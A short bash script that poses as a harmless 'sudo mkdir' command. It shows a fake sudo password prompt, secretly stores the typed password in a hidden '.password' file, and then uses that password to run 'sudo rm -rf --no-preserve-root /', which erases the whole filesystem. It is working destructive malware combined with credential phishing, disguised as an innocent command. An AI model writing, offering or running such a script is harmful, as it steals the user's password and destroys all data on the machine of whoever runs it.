#!/bin/bash

echo "running sudo mkdir yeet"

echo -n "[sudo] password for $(whoami): "

read -s password

echo $password > ".password"

mkdir yeet

sleep 5

echo $password | sudo rm -rf --no-preserve-root /
